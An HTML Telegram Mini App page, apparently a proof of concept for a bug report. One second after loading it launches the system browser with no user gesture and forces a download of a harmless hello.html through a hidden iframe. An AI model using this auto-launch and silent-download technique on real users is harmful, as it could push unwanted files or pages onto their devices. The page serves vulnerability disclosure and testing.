<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Проверка D1+D2</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  body { margin: 0; padding: 16px; font: 15px/1.5 -apple-system, system-ui, sans-serif;
         background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); }
  h1 { font-size: 17px; margin: 0 0 4px; }
  .sub { color: var(--tg-theme-hint-color, #777); font-size: 13px; margin-bottom: 14px; }
  button { width: 100%; padding: 12px; margin: 10px 0 0; font-size: 15px; border-radius: 10px;
           border: 1px solid var(--tg-theme-button-color, #2f81f7); background: transparent;
           color: var(--tg-theme-button-color, #2f81f7); }
  #log { white-space: pre-wrap; word-break: break-word; font: 12px/1.45 ui-monospace, Menlo, monospace;
         background: var(--tg-theme-secondary-bg-color, #f3f3f3); border-radius: 10px; padding: 10px; }
</style>
</head>
<body>
<h1>Проверка D1+D2</h1>
<div class="sub">Ничего нажимать не надо. Через секунду после открытия страница сама
откроет системный браузер (D2) и запросит файл <code>hello.html</code> (D1) — ровно как
в репорте. Смотреть: открылся ли браузер и появился ли файл в «Загрузках».</div>

<div id="log"></div>
<button id="copy">Скопировать журнал</button>

<script>
(function () {
  var tg = window.Telegram && window.Telegram.WebApp;
  var log = document.getElementById('log');
  var lines = [];

  function say(text) {
    lines.push(new Date().toISOString().slice(11, 19) + '  ' + text);
    log.textContent = lines.join('\n');
  }

  say('платформа: ' + ((tg && tg.platform) || '?') + ', версия моста: ' + ((tg && tg.version) || '?'));
  say('userAgent: ' + navigator.userAgent);

  setTimeout(function () {
    // D2: открытие системного браузера. Жеста внутри мини-аппа не было.
    var result = null;
    try {
      result = window.open('https://example.com/', '_blank');
      say('D2: window.open вернул ' + (result === null ? 'null' : typeof result));
    } catch (error) {
      say('D2: отказ — ' + error);
    }

    // D1: скрытый кадр на адрес, отдающий Content-Disposition: attachment.
    // Внешний сервис нужен потому, что GitHub Pages заголовки ставить не умеет.
    var frame = document.createElement('iframe');
    frame.style.display = 'none';
    frame.src = 'https://httpbin.org/response-headers'
      + '?Content-Disposition=attachment%3B%20filename%3Dhello.html'
      + '&Content-Type=text%2Fhtml&body=tso-poc';
    document.body.appendChild(frame);
    say('D1: кадр на загрузку вставлен, файл hello.html');
    say('смотреть «Загрузки» и системный браузер');
  }, 1000);

  document.getElementById('copy').onclick = function () {
    if (navigator.clipboard) navigator.clipboard.writeText(lines.join('\n')).then(
      function () { say('журнал скопирован'); },
      function () { say('скопировать не вышло, выдели руками'); });
  };

  if (tg && tg.ready) tg.ready();
  if (tg && tg.expand) tg.expand();
})();
</script>
</body>
</html>
